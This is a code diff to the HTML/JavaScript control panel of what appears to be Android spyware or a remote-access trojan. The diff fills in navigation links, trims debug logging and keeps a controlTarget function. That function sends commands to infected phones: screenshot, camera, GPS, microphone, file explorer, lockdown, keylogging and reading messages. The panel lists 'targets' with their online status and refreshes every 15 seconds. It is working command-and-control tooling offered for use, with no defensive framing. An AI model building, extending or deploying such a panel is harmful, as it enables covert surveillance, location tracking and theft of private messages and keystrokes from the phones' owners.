@@ -17,9 +17,9 @@
                 <nav class="nav flex-column">
                     <a class="nav-link active" href="panel.html"><i class="bi bi-grid"></i> Dashboard</a>
                     <a class="nav-link" href="target.html"><i class="bi bi-phone"></i> Targets</a>
-                    <a class="nav-link" href="#"><i class="bi bi-terminal"></i> Commands</a>
-                    <a class="nav-link" href="#"><i class="bi bi-file-earmark-text"></i> Logs</a>
-                    <a class="nav-link" href="#"><i class="bi bi-gear"></i> Settings</a>
+                    <a class="nav-link" href="commands.html"><i class="bi bi-terminal"></i> Commands</a>
+                    <a class="nav-link" href="logs.html"><i class="bi bi-file-earmark-text"></i> Logs</a>
+                    <a class="nav-link" href="settings.html"><i class="bi bi-gear"></i> Settings</a>
                     <hr style="border-color:#1f2a3a;">
                     <a class="nav-link text-danger" href="#" onclick="logout()"><i class="bi bi-box-arrow-right"></i> Logout</a>
                 </nav>
@@ -56,60 +56,35 @@
         </div>
     </div>
     <script type="module">
-        // ================================================================
-        // PANEL UTAMA — DENGAN TOKEN CHECK
-        // ================================================================
         import { API_BASE } from './js/config.js';
-
-        console.log('🔹 Panel loaded');
         const token = localStorage.getItem('token');
-        console.log('🔹 Token:', token ? token.substring(0,20) + '...' : 'null');
+        if (!token) window.location.replace('index.html');
 
-        if (!token) {
-            console.log('❌ No token, redirect to login');
-            window.location.replace('index.html');
-            throw new Error('Redirect to login');
-        }
-
-        // ================================================================
-        // FUNGSI LOGOUT
-        // ================================================================
         window.logout = function() {
-            console.log('🔹 Logout called');
             localStorage.removeItem('token');
             localStorage.removeItem('api_base');
             window.location.replace('index.html');
         };
 
-        // ================================================================
-        // FETCH TARGETS
-        // ================================================================
         async function loadTargets() {
-            console.log('🔹 Loading targets...');
             try {
                 const res = await fetch(API_BASE + '/api/targets', {
                     headers: { 'Authorization': `Bearer ${token}` }
                 });
-                console.log('🔹 Response status:', res.status);
                 if (res.status === 401) { logout(); return; }
                 const data = await res.json();
-                console.log('🔹 Data:', data);
                 renderTargets(data);
                 updateStats(data);
                 updateChart(data);
             } catch (e) {
-                console.error('🔥 Load targets error:', e);
+                console.error('Load targets error:', e);
                 document.getElementById('recentCommands').innerText = '[error] Failed to load targets';
             }
         }
         window.loadTargets = loadTargets;
 
-        // ================================================================
-        // RENDER TARGETS
-        // ================================================================
         function renderTargets(targets) {
             const body = document.getElementById('targetBody');
-            if (!body) return;
             body.innerHTML = '';
             if (!targets || targets.length === 0) {
                 body.innerHTML = '<tr><td colspan="7" class="text-center text-muted">No targets registered yet.</td></tr>';
@@ -138,9 +113,6 @@
             });
         }
 
-        // ================================================================
-        // UPDATE STATISTICS
-        // ================================================================
         function updateStats(targets) {
             const total = targets.length;
             const online = targets.filter(t => t.status === 'online').length;
@@ -151,9 +123,6 @@
             document.getElementById('totalCommands').innerText = '0';
         }
 
-        // ================================================================
-        // CHART UPDATER
-        // ================================================================
         let chartInstance = null;
         function updateChart(targets) {
             const ctx = document.getElementById('activityChart');
@@ -185,16 +154,12 @@
             });
         }
 
-        // ================================================================
-        // CONTROL TARGET
-        // ================================================================
         window.controlTarget = function(uuid) {
             const cmd = prompt(`Commands for ${uuid}:\n1: screenshot\n2: camera\n3: gps\n4: mic\n5: file_explorer\n6: lockdown\n7: keylog\n8: read_messages\n\nEnter command number:`);
             if (!cmd) return;
             const commands = ['screenshot', 'camera', 'gps', 'mic', 'file_explorer', 'lockdown', 'keylog', 'read_messages'];
             const selected = commands[parseInt(cmd) - 1];
             if (!selected) return alert('Invalid command number');
-            
             fetch(API_BASE + '/api/commands', {
                 method: 'POST',
                 headers: {
@@ -215,17 +180,10 @@
             .catch(e => alert('Network error: ' + e.message));
         };
 
-        // ================================================================
-        // VIEW TARGET DETAIL
-        // ================================================================
         window.viewTarget = function(uuid) {
             window.location.href = 'target.html?uuid=' + encodeURIComponent(uuid);
         };
 
-        // ================================================================
-        // START
-        // ================================================================
-        console.log('🔹 Initializing panel...');
         loadTargets();
         setInterval(loadTargets, 15000);
     </script>
